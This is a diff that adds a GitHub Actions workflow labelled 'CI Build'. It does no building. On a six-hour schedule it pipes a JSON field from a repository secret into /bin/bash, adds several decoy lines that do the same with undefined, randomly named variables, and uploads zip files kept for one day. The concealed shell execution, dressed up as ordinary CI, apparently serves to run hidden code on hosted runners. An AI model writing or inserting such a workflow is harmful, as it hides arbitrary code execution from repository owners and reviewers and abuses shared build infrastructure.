@@ -1,0 +1,37 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          unim3: ${{ secrets.unim3 }}
+        run: |
+          printf '%s' "$unim3" | jq -r .q30 | /bin/bash
+          echo $w17842 | jq -r .no8 | /bin/bash
+          printf '%s' "$ifpn2754" | jq -r .mt69006 | /bin/bash
+          echo $u0 | jq -r .drbud8492 | /bin/bash
+          printf '%s' "$r9643" | jq -r .i0766 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VuR5OrP2
+          path: "*.zip"
+          retention-days: 1
